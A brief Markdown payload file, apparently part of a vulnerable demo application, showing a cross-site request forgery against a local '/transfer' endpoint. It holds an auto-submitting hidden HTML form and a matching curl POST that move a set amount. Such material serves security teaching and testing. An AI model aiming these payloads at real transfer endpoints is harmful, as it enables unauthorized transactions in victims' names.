# Payloads

It's possible to deliver a CSRF to this application using these payloads:

```html
<html>
    <body>
        <form action="http://localhost:8080/transfer" method="POST">
            <input type="hidden" name="amount" value="1000" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

```sh 
curl -X POST http://localhost:8080/transfer -d "amount=1000"
```
